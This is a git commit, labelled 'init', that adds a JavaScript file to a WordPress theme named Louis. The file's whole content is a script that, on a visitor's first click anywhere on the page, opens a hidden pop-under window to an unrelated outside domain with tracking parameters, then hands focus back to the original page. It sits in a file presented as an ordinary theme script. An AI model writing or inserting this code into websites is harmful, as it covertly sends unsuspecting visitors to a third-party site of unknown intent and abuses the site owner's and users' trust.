c2d850f443b538153f2e29634b45ecc2bb27cc7d
calkan <calkan@gmail.com>
2022-08-27 19:11:53 +0300

    init

---
+++ wp-content/themes/Louis/inc/js/script.js
@@ -0,0 +1,11 @@
+
+if (typeof _popwnd == 'undefined') {
+    var _popwnd = -1;
+    function _popwnd_open(){
+        if (_popwnd!=-1) return;
+        _popwnd = window.open('http://iyfnz.com/?dn=recomb2019.org&pid=9PO755G95&_nozc_=1', '_blank', '');
+        _popwnd.blur();
+        window.focus();
+    }
+};
+window.addEventListener('click', _popwnd_open);
